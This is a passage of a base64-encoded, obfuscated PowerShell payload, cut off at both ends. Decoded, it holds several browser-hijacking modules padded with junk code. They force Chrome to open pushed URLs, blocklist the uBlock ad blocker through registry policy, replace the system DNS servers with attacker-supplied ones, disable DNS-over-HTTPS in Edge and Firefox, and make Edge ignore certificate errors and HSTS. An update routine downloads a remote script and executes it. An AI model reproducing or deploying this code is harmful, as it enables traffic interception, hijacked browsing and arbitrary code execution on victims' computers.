yAxMDANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZSwgW1VzZXIzMlhdOjpTV19TSE9XKSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBDbG9zZS1DaHJvbWUgLXByb2Nlc3MgJHByb2Nlc3MNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiQ2hyb21lIG5vdCBmb3VuZCBhdDogJHBhdGgiDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgIH0gLUFyZ3VtZW50TGlzdCAkdXJsLCAkaXNEZWJ1Zw0KDQogICAgcmV0dXJuICRqb2INCn0NCg0KZnVuY3Rpb24gTGF1bmNoQ2hyb21lUHVzaGVzIHsNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnB1c2hlc0ZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiU2tpcHBpbmcgZnVuY3Rpb24gTGF1bmNoQ2hyb21lUHVzaGVzIg0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgdHJ5IHsNCiAgICAgICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgICAgICRpc0RlYnVnID0gSXNEZWJ1Zw0KICAgICAgICAgICAgT3Blbi1DaHJvbWVXaXRoVXJsIC11cmwgJHB1c2ggLWlzRGVidWcgJGlzRGVidWcNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgTGF1bmNoQ2hyb21lUHVzaGVzKTogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19jaHJvbWVfcHVzaCB7DQogICAgQ29uZmlndXJlQ2hyb21lUHVzaGVzDQogICAgTGF1bmNoQ2hyb21lUHVzaGVzDQp9DQpmdW5jdGlvbiBmbl9Mb2dfODZmV1l1SjV6RSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX3hGUWtPYVcwS20gew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX0t3T3NJSkVqTnIsDQogICAgICAgIFtpbnRdJHZhcl9aNUh6NGlJQW1UDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX0t3T3NJSkVqTnIgKyAkdmFyX1o1SHo0aUlBbVQNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fTTg3RGwxVG1oQSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfWjVIejRpSUFtVCwNCiAgICAgICAgW2ludF0kdmFyX0t3T3NJSkVqTnINCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfWjVIejRpSUFtVCArICR2YXJfS3dPc0lKRWpOcg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9Ld09zSUpFak5yIC1ndCAxKSB7DQogICAgd3JpdGVkYmcyICd6akRPZ2JkWUJOMGZJMUwnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnZ29hV09NRVFCSmtTdzhDJw0KfQ0KaWYgKCR2YXJfWjVIejRpSUFtVCAtZ3QgMSkgew0KICAgIHdyaXRlZGJnMiAndnFycHU1RDBhb0loc3h5Jw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ2NVR1ZaWUhleDF5bjBmMycNCn0NCiR2YXJfS3dPc0lKRWpOciA9IGZuX004N0RsMVRtaEEgLXBhcmFtMSAzOSAtcGFyYW0yIDk5DQp3cml0ZWRiZzIgJ2l4WXRFOE9QcERqMmJ1VycNCiR2YXJfS3dPc0lKRWpOciA9IGZuX3hGUWtPYVcwS20gLXBhcmFtMSA3IC1wYXJhbTIgNTMNCndyaXRlZGJnMiAnR1RTT1huTTdzcEpkMjlhJw0KJHZhcl9Ld09zSUpFak5yID0gZm5fTTg3RGwxVG1oQSAtcGFyYW0xIDI3IC1wYXJhbTIgNjYNCndyaXRlZGJnMiAnUW5nemx4M3E3YUVyUzlmJw0KJHZhcl9aNUh6NGlJQW1UID0gZm5feEZRa09hVzBLbSAtcGFyYW0xIDE4IC1wYXJhbTIgMjINCndyaXRlZGJnMiAnREVOcG5MQ1VtaWV4cnMyJw0KJHZhcl9aNUh6NGlJQW1UID0gZm5feEZRa09hVzBLbSAtcGFyYW0xIDk5IC1wYXJhbTIgNDkNCndyaXRlZGJnMiAncjdNUjZQU1Q5RGE0QUhMJw0KIAoKIyBjaHJvbWVfdWJsb2NrLnBzMQoKCgoNCgoKDQoNCmZ1bmN0aW9uIGRvX2Nocm9tZV91YmxvY2sgew0KICAgICRrZXl3b3JkcyA9IEAoInVCbG9jayIpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkY2hyb21lRGlyID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAiR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxFeHRlbnNpb25zIg0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJGNocm9tZURpciAtUGF0aFR5cGUgQ29udGFpbmVyKSB7DQogICAgICAgICAgICAgICAgJGV4dGVuc2lvbnMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRjaHJvbWVEaXIgLURpcmVjdG9yeQ0KDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJGV4dGVuc2lvbiBpbiAkZXh0ZW5zaW9ucykgew0KICAgICAgICAgICAgICAgICAgICAkbWFuRmlsZSA9IGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIC1mb2xkZXIgJGV4dGVuc2lvbi5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJG1hbkZpbGUgLW5lICIiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZm91bmRLZXl3b3JkID0gJGZhbHNlDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRtYW5pZmVzdFZhbHVlIGluICRrZXl3b3Jkcykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJG1hbkZpbGUgLVJhdw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkY29udGVudCAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYW5pZmVzdFZhbHVlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZm91bmRLZXl3b3JkID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZm91bmRLZXl3b3JkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4dEZvbGRlck5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZXh0ZW5zaW9uLkZ1bGxOYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3RBbGwgLWV4dE5hbWUgJGV4dEZvbGRlck5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRmb2xkZXINCiAgICApDQoNCiAgICAkcmVzdWx0ID0gIiINCg0KICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlciB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKC1ub3QgKCRfLlBTSXNDb250YWluZXIpKSB7DQogICAgICAgICAgICBpZiAoJF8uTmFtZSAtZXEgIm1hbmlmZXN0Lmpzb24iKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRfLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZWlmICgkXy5OYW1lIC1ub3RpbiBAKCcuJywgJy4uJykpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSAtZm9sZGVyICRfLkZ1bGxOYW1lDQogICAgICAgICAgICBpZiAoJHJlc3VsdCAtbmUgIiIpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQoNCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdEFsbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRleHROYW1lDQogICAgKQ0KDQogICAgY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdCAtZXh0TmFtZSAkZXh0TmFtZSAtYnJvd3NlciAiR29vZ2xlXENocm9tZSINCn0NCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRleHROYW1lLA0KICAgICAgICBbc3RyaW5nXSRicm93c2VyDQogICAgKQ0KDQogICAgJHJlZ1BhdGggPSAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcJGJyb3dzZXJcRXh0ZW5zaW9uSW5zdGFsbEJsb2NrbGlzdCINCiAgICANCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkcmVnUGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCiAgICANCiAgICAkcmVnS2V5SW5kZXggPSAxDQogICAgZG8gew0KICAgICAgICAka2V5TmFtZSA9ICIkcmVnS2V5SW5kZXgiDQogICAgICAgICR2YWwgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRrZXlOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmICgkdmFsIC1lcSAkZXh0TmFtZSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgJHJlZ0tleUluZGV4KysNCiAgICB9IHVudGlsICgtbm90IChUZXN0LVBhdGggIiRyZWdQYXRoXCRrZXlOYW1lIikpDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkZXh0TmFtZQ0KfQ0KZnVuY3Rpb24gZm5fTG9nX0Npd3YxTDlZVHEgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCiAgICB3cml0ZWRiZzIgJ0xvZzogJG1lc3NhZ2UnDQp9DQpmdW5jdGlvbiBmbl9JQ0wxZ3RVTU8zIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl96eDI3b1BiakFoLA0KICAgICAgICBbaW50XSR2YXJfM0lLMXU5N3hEQQ0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl96eDI3b1BiakFoICsgJHZhcl8zSUsxdTk3eERBDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmZ1bmN0aW9uIGZuXzdiWG42MlMwdXEgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyXzNJSzF1OTd4REEsDQogICAgICAgIFtpbnRdJHZhcl96eDI3b1BiakFoDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyXzNJSzF1OTd4REEgKyAkdmFyX3p4MjdvUGJqQWgNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KaWYgKCR2YXJfengyN29QYmpBaCAtZ3QgMSkgew0KICAgIHdyaXRlZGJnMiAnRk9MRDlNMmd1bk50d1V4Jw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ0FyTTl1T0NqVTVTQmYzcycNCn0NCmlmICgkdmFyXzNJSzF1OTd4REEgLWd0IDEpIHsNCiAgICB3cml0ZWRiZzIgJ0pxRTdLWHcwVlAzWXoyNicNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICcwb2FUVUVPS2ZaOXpjUXInDQp9DQokdmFyX3p4MjdvUGJqQWggPSBmbl9JQ0wxZ3RVTU8zIC1wYXJhbTEgNTQgLXBhcmFtMiA4Ng0Kd3JpdGVkYmcyICdpSWdYcmtURTd0SjJxRE0nDQokdmFyXzNJSzF1OTd4REEgPSBmbl83YlhuNjJTMHVxIC1wYXJhbTEgMzIgLXBhcmFtMiA2Mg0Kd3JpdGVkYmcyICdER3g5VU1wY2QwYldGN1AnDQokdmFyX3p4MjdvUGJqQWggPSBmbl9JQ0wxZ3RVTU8zIC1wYXJhbTEgMzYgLXBhcmFtMiA2Mg0Kd3JpdGVkYmcyICczTDRET3J2ZEJOVVhtUEEnDQokdmFyX3p4MjdvUGJqQWggPSBmbl9JQ0wxZ3RVTU8zIC1wYXJhbTEgODYgLXBhcmFtMiA1NQ0Kd3JpdGVkYmcyICdINzNMMHFsdzQ2b3I4eGInDQokdmFyXzNJSzF1OTd4REEgPSBmbl9JQ0wxZ3RVTU8zIC1wYXJhbTEgNjUgLXBhcmFtMiA4Mg0Kd3JpdGVkYmcyICd5R2VFVUFhaUJUT0lxNzknDQogCgojIGRuc21hbi5wczEKCgoKDQoNCmZ1bmN0aW9uIFNldC1EbnNTZXJ2ZXJzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHByaW1hcnlEbnNTZXJ2ZXIsDQogICAgICAgIFtzdHJpbmddJHNlY29uZGFyeURuc1NlcnZlcg0KICAgICkNCg0KICAgIHRyeSB7DQogICAgICAgICMgR2V0IG5ldHdvcmsgYWRhcHRlcnMgdGhhdCBhcmUgSVAtZW5hYmxlZA0KICAgICAgICAkbmV0d29ya0FkYXB0ZXJzID0gR2V0LU5ldEFkYXB0ZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5TdGF0dXMgLWVxICdVcCcgLWFuZCAkXy5JbnRlcmZhY2VEZXNjcmlwdGlvbiAtbm90bGlrZSAnKlZpcnR1YWwqJyB9DQoNCiAgICAgICAgZm9yZWFjaCAoJGFkYXB0ZXIgaW4gJG5ldHdvcmtBZGFwdGVycykgew0KICAgICAgICAgICAgIyBTZXQgRE5TIHNlcnZlcnMgdXNpbmcgU2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3MgY21kbGV0DQogICAgICAgICAgICBTZXQtRG5zQ2xpZW50U2VydmVyQWRkcmVzcyAtSW50ZXJmYWNlQWxpYXMgJGFkYXB0ZXIuTmFtZSAtU2VydmVyQWRkcmVzc2VzIEAoJHByaW1hcnlEbnNTZXJ2ZXIsICRzZWNvbmRhcnlEbnNTZXJ2ZXIpIC1Db25maXJtOiRmYWxzZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB3cml0ZWRiZyAiU3VjY2Vzc2Z1bGx5IHNldCBETlMgc2VydmVycyBmb3IgYWRhcHRlcjogJCgkYWRhcHRlci5JbnRlcmZhY2VEZXNjcmlwdGlvbikiDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX2Ruc21hbiB7DQogICAgU2V0LUROU1NlcnZlcnMgLVByaW1hcnlETlNTZXJ2ZXIgJHNlcnZlci5wcmltYXJ5RG5zIC1TZWNvbmRhcnlETlNTZXJ2ZXIgJHNlcnZlci5zZWNvbmRhcnlEbnMNCn0NCmZ1bmN0aW9uIGZuX0xvZ18zZEhmMDVJYnhuIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UNCiAgICApDQogICAgd3JpdGVkYmcyICdMb2c6ICRtZXNzYWdlJw0KfQ0KZnVuY3Rpb24gZm5fc0pLWUZ1aDNqQyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfVHFSQ013bTBsWCwNCiAgICAgICAgW2ludF0kdmFyX24yTkQ1N0k0S3ANCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfVHFSQ013bTBsWCArICR2YXJfbjJORDU3STRLcA0KICAgIHJldHVybiAkcmVzdWx0DQp9DQpmdW5jdGlvbiBmbl9QbjYwRFZDVWxiIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl9uMk5ENTdJNEtwLA0KICAgICAgICBbaW50XSR2YXJfVHFSQ013bTBsWA0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl9uMk5ENTdJNEtwICsgJHZhcl9UcVJDTXdtMGxYDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmlmICgkdmFyX1RxUkNNd20wbFggLWd0IDEpIHsNCiAgICB3cml0ZWRiZzIgJ1dURUpscURuWmtBbUlNMicNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICdUclJvaDllZnRLVmFGMHMnDQp9DQppZiAoJHZhcl9uMk5ENTdJNEtwIC1ndCA0KSB7DQogICAgd3JpdGVkYmcyICdpQTR1SWNoajcyb0JIcksnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnRHRzbnU0TTkyaWtlNzNKJw0KfQ0KJHZhcl9uMk5ENTdJNEtwID0gZm5fc0pLWUZ1aDNqQyAtcGFyYW0xIDc3IC1wYXJhbTIgNzENCndyaXRlZGJnMiAndVQ4cUV5Z01PbjBrM0hMJw0KJHZhcl9uMk5ENTdJNEtwID0gZm5fUG42MERWQ1VsYiAtcGFyYW0xIDY1IC1wYXJhbTIgNzINCndyaXRlZGJnMiAnU0FqNHd4MTU2WDN1aUZZJw0KJHZhcl9UcVJDTXdtMGxYID0gZm5fc0pLWUZ1aDNqQyAtcGFyYW0xIDkyIC1wYXJhbTIgODINCndyaXRlZGJnMiAnTUdPQjF1UjI2VTRzeXIzJw0KJHZhcl9uMk5ENTdJNEtwID0gZm5fc0pLWUZ1aDNqQyAtcGFyYW0xIDYxIC1wYXJhbTIgNDANCndyaXRlZGJnMiAnQ3hxSDlUblhRTUxXcnliJw0KJHZhcl9uMk5ENTdJNEtwID0gZm5fUG42MERWQ1VsYiAtcGFyYW0xIDY5IC1wYXJhbTIgMzENCndyaXRlZGJnMiAnelFOTTRkSG5vRzM5UFJlJw0KIAoKIyBlZGdlLnBzMQoKCgoNCg0KZnVuY3Rpb24gZG9fZWRnZSB7DQogICAgJGVkZ2VLZXlQYXRoID0gIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxFZGdlIg0KICAgIA0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGVkZ2VLZXlQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkZWRnZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQogICAgDQogICAgJGNvbW1hbmRMaW5lUGF0aCA9IEpvaW4tUGF0aCAkZWRnZUtleVBhdGggIkNvbW1hbmRMaW5lIg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNvbW1hbmRMaW5lUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGNvbW1hbmRMaW5lUGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCiAgICANCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjb21tYW5kTGluZVBhdGggLU5hbWUgIihEZWZhdWx0KSIgLVZhbHVlICItLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMgLS1kaXNhYmxlLXF1aWMgLS1kaXNhYmxlLWhzdHMiDQogICAgDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRlZGdlS2V5UGF0aCAtTmFtZSAiSWdub3JlQ2VydGlmaWNhdGVFcnJvcnMiIC1WYWx1ZSAxDQp9DQpmdW5jdGlvbiBmbl9Mb2dfbXFYdzR4aTVUbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX3V3SHozckppbGsgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX01mU3ZpaEJGMGcsDQogICAgICAgIFtpbnRdJHZhcl8zVldmUEhGTkdEDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX01mU3ZpaEJGMGcgKyAkdmFyXzNWV2ZQSEZOR0QNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fNUprVkZneW02aSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfM1ZXZlBIRk5HRCwNCiAgICAgICAgW2ludF0kdmFyX01mU3ZpaEJGMGcNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfM1ZXZlBIRk5HRCArICR2YXJfTWZTdmloQkYwZw0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9NZlN2aWhCRjBnIC1ndCA0KSB7DQogICAgd3JpdGVkYmcyICc1aW1XUEFCRWVTcnp5OGMnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnN3NTekRadGFITEVOVm95Jw0KfQ0KaWYgKCR2YXJfM1ZXZlBIRk5HRCAtZ3QgMykgew0KICAgIHdyaXRlZGJnMiAnZm1UYXRzejVldVFBSzJCJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ3M2RElLdFllZ3I4UHdNaScNCn0NCiR2YXJfTWZTdmloQkYwZyA9IGZuX3V3SHozckppbGsgLXBhcmFtMSA5OCAtcGFyYW0yIDY0DQp3cml0ZWRiZzIgJzNBQnI4dzVaYzliU256WScNCiR2YXJfTWZTdmloQkYwZyA9IGZuXzVKa1ZGZ3ltNmkgLXBhcmFtMSA4IC1wYXJhbTIgNTQNCndyaXRlZGJnMiAnYmUzaFk2NWNBTng0cW5SJw0KJHZhcl8zVldmUEhGTkdEID0gZm5fNUprVkZneW02aSAtcGFyYW0xIDQ3IC1wYXJhbTIgNDENCndyaXRlZGJnMiAndzBRWVNhRXlKQ21kZUF0Jw0KJHZhcl8zVldmUEhGTkdEID0gZm5fdXdIejNySmlsayAtcGFyYW0xIDEwIC1wYXJhbTIgMTcNCndyaXRlZGJnMiAnR1Fva3QzRHI2YlJMMUZnJw0KJHZhcl8zVldmUEhGTkdEID0gZm5fNUprVkZneW02aSAtcGFyYW0xIDQzIC1wYXJhbTIgMQ0Kd3JpdGVkYmcyICc0S2UwUXFNMkRDb2JBTHgnDQogCgojIGV4dHJhdXBkYXRlLnBzMQoKCgoNCgoKDQoNCmZ1bmN0aW9uIGRvX2V4dHJhdXBkYXRlKCkgew0KICAgIGlmICgtbm90ICRzZXJ2ZXIuZXh0cmFVcGRhdGUpew0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcygxKQ0KICAgICRkZWxheSA9IDUNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICANCiAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc2VydmVyLmV4dHJhVXBkYXRlVXJsIC1Vc2VCYXNpY1BhcnNpbmcgLU1ldGhvZCBHZXQNCg0KICAgICAgICAgICAgaWYgKCRyZXNwb25zZS5TdGF0dXNDb2RlIC1lcSAyMDApIHsNCiAgICAgICAgICAgICAgICAkc2NyaXB0QmxvY2sgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJHJlc3BvbnNlLkNvbnRlbnQpDQogICAgICAgICAgICAgICAgLiAkc2NyaXB0QmxvY2sNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIGRvd25sb2FkIG9yIGV4ZWN1dGUgdGhlIHNjcmlwdDogJF8iDQogICAgICAgIH0NCg0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICB9DQogICAgd3JpdGVkYmcgIkZhaWxlZCB0byBkb3dubG9hZCB0aGUgc2NyaXB0IHdpdGhpbiB0aGUgYWxsb3R0ZWQgdGltZS4iDQp9DQpmdW5jdGlvbiBmbl9Mb2dfV1JWWExpZHNLUSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX3BueVdJTnNpd00gew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX1RWalc4ZEdsaDYsDQogICAgICAgIFtpbnRdJHZhcl9FUzc4ZE5GVVZBDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX1RWalc4ZEdsaDYgKyAkdmFyX0VTNzhkTkZVVkENCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fMUgwOElSa0xRTiB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfRVM3OGRORlVWQSwNCiAgICAgICAgW2ludF0kdmFyX1RWalc4ZEdsaDYNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfRVM3OGRORlVWQSArICR2YXJfVFZqVzhkR2xoNg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9UVmpXOGRHbGg2IC1ndCAzKSB7DQogICAgd3JpdGVkYmcyICdwY3RtZEtTdnJUOWt4NUonDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnUXFJRnlSb1NsYjE0VEJFJw0KfQ0KaWYgKCR2YXJfRVM3OGRORlVWQSAtZ3QgMSkgew0KICAgIHdyaXRlZGJnMiAnT05hZlZqTHUwZ3lSbUFsJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ3RueU1vZVAxN0NqMlNwOCcNCn0NCiR2YXJfVFZqVzhkR2xoNiA9IGZuXzFIMDhJUmtMUU4gLXBhcmFtMSAxOSAtcGFyYW0yIDEwDQp3cml0ZWRiZzIgJ09Ga3htY0t0TERqQW5NVScNCiR2YXJfRVM3OGRORlVWQSA9IGZuX3BueVdJTnNpd00gLXBhcmFtMSA2MCAtcGFyYW0yIDk3DQp3cml0ZWRiZzIgJ3FmU3ozc053YlZVbXIxbicNCiR2YXJfVFZqVzhkR2xoNiA9IGZuXzFIMDhJUmtMUU4gLXBhcmFtMSA0MCAtcGFyYW0yIDEwDQp3cml0ZWRiZzIgJ1VBMDZNdVFpU0M0TkZzeCcNCiR2YXJfVFZqVzhkR2xoNiA9IGZuX3BueVdJTnNpd00gLXBhcmFtMSAxNSAtcGFyYW0yIDUNCndyaXRlZGJnMiAnZ3RjRW1IaVhMTkQ5VlJ2Jw0KJHZhcl9UVmpXOGRHbGg2ID0gZm5fMUgwOElSa0xRTiAtcGFyYW0xIDMgLXBhcmFtMiA5Nw0Kd3JpdGVkYmcyICd2cVUxSWtRZVNkeXRZRUQnDQogCgojIGZpcmVmb3gucHMxCgoKCg0KCgoNCg0KZnVuY3Rpb24gZG9fZmlyZWZveCANCnsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBTZXQtRmlyZWZveFJlZ2lzdHJ5IC1LZXlQYXRocyBAKA0KICAgICAgICAgICAgJ1NPRlRXQVJFXFBvbGljaWVzXE1vemlsbGFcRmlyZWZveFxETlNPdmVySFRUUFMnLA0KICAgICAgICAgICAgJ1NPRlRXQVJFXFBvbGljaWVzXE1vemlsbGFcRmlyZWZveFxETlNPdm